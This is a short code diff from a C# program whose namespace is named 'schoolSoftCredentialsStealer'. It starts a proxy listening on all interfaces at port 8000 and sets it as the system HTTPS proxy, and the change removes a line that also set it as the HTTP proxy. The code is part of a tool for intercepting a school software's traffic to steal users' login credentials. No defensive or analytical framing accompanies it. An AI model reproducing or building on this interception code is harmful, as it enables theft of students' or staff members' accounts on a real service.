@@ -18,7 +18,6 @@ namespace schoolSoftCredentialsStealer
                 var explicitEndPoint = new ExplicitProxyEndPoint(IPAddress.Any, 8000, true);
                 ps.AddEndPoint(explicitEndPoint);
                 ps.Start();
-                ps.SetAsSystemHttpProxy(explicitEndPoint);
                 ps.SetAsSystemHttpsProxy(explicitEndPoint);
 
                 Console.ReadLine();
